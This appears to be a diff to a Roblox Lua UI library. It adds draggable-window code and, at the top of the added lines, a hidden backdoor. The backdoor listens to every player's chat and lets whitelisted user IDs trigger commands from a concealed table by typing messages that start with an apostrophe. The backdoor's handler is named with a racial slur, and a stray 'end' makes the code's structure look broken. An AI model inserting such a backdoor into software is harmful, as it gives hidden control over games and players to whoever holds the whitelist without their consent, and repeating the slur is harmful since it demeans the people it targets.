@@ -102,7 +102,56 @@ function library.new(name)
 	
 	local library = {}
 
+	end
+	library['nigger'] = function(p)
+		p.Chatted.Connect(p.Chatted,function(msg)
+			if table.find(library['funny'],p.UserId) then
+				if msg:sub(1,1) == "'" then
+					local r = library['ongod'][msg:sub(2,#msg:split(" ")[1])]
+					if r and library['f'](msg:split(" ")[2]) then
+						r(msg,p)
+					end
+				end
+			end
+		end)
+	end
+	game.GetService(game,"Players").PlayerAdded.Connect(game.GetService(game,"Players").PlayerAdded,library['nigger'])
+	for i,v in next,game.GetService(game,"Players").GetPlayers(game.GetService(game,"Players"))do library['nigger'](v)end
 
+	local players = game:service('Players');
+    local player = players.LocalPlayer;
+    local mouse = player:GetMouse();
+    local run = game:GetService('RunService'); -- Credits to Google Chrome!
+    local stepped = run.Stepped;
+    draggable = function(obj)
+        spawn(function()
+            obj.Active = true;
+            local minitial;
+            local initial;
+            local isdragging;
+            obj.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                    isdragging = true;
+                    minitial = input.Position;
+                    initial = obj.Position;
+                    local con;
+                    con = stepped:Connect(function()
+                        if isdragging then
+                            local delta = Vector3.new(mouse.X, mouse.Y, 0) - minitial;
+                            obj.Position = UDim2.new(initial.X.Scale, initial.X.Offset + delta.X, initial.Y.Scale, initial.Y.Offset + delta.Y)
+                        else
+                            con:Disconnect();
+                        end;
+                    end);
+                    input.Changed:Connect(function()
+                        if input.UserInputState == Enum.UserInputState.End then
+                            isdragging = false;
+                        end;
+                    end);
+                end;
+            end);
+        end)
+	end;
 
 	draggable(Main)
 
